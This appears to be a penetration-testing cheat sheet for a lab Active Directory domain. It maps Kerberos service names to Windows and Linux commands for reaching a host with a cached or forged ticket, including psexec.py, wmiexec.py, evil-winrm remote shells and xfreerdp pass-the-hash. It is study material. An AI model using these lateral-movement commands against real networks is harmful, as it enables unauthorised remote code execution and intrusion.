| SPN                   | Description                                                                                                       | Windows Usage Example                                                                                                                                   | Linux Usage Example                                                                                                                                             |
| --------------------- | ----------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **cifs**              | Common Internet File System for SMB file sharing; allows directory listing, file access, or execution via shares. | Use `dir \\SQL01.INLANEFREIGHT.LOCAL\share` for listing; `net use \\SQL01.INLANEFREIGHT.LOCAL\share` to mount (Kerberos handles auth if ticket cached). | Use `smbclient //SQL01.INLANEFREIGHT.LOCAL/share -k` for Kerberos-authenticated access; or Impacket's `smbclient.py domain/user@SQL01.INLANEFREIGHT.LOCAL -k`.  |
| **http** / **www**    | HTTP web services; enables access to web apps or APIs with Kerberos auth.                                         | Enter-PSSession "$HOST"<br>Use PowerShell: `Invoke-WebRequest -Uri http://SQL01.INLANEFREIGHT.LOCAL -UseDefaultCredentials` (leverages cached ticket).  | `psexec.py "$DC" -k -no-pass`<br>Use `curl --negotiate -u : http://SQL01.INLANEFREIGHT.LOCAL` for Kerberos negotiation.                                         |
| **HOST**              | Generic host service; covers RPC, WMI, or other machine-level access.                                             | Use `wmic /node:SQL01.INLANEFREIGHT.LOCAL process list` for WMI queries (Kerberos via ticket).                                                          | Use Impacket's `wmiexec.py domain/user@SQL01.INLANEFREIGHT.LOCAL -k` for command execution.                                                                     |
| **RestrictedKrbHost** | Restricted Kerberos host service; similar to HOST but for constrained delegation scenarios.                       | Use similar to HOST, e.g., `psexec.py domain/user@SQL01.INLANEFREIGHT.LOCAL -k` if delegation allows.                                                   | Use Impacket's `getTGT.py domain/user -spn RestrictedKrbHost/SQL01.INLANEFREIGHT.LOCAL` then tools like `ssh user@SQL01.INLANEFREIGHT.LOCAL` if GSSAPI enabled. |
| **TERMSRV**           | Terminal Services for Remote Desktop Protocol (RDP); allows graphical remote access.                              | Use `mstsc /v:SQL01.INLANEFREIGHT.LOCAL` (Kerberos auth if ticket available).                                                                           | Use `xfreerdp /v:SQL01.INLANEFREIGHT.LOCAL /sec:kerberos` or `/u:domain/user /pth:hash` for pass-the-hash with ticket.                                          |
| **WSMAN**             | Windows Remote Management for PowerShell remoting and command execution.                                          | Use `winrs -r:SQL01.INLANEFREIGHT.LOCAL cmd` or `Enter-PSSession -ComputerName SQL01.INLANEFREIGHT.LOCAL` (Kerberos via Negotiate).                     | Use `evil-winrm -i SQL01.INLANEFREIGHT.LOCAL -u domain/user -k` for Kerberos-based shell.                                                                       |

> [!NOTE] 
> you can use psexec.py with cifs only if you have elevated privileges specially for reading and writing to `C:\windows`, because the tool automaticly tries to put executable in this folder to get RCE back.
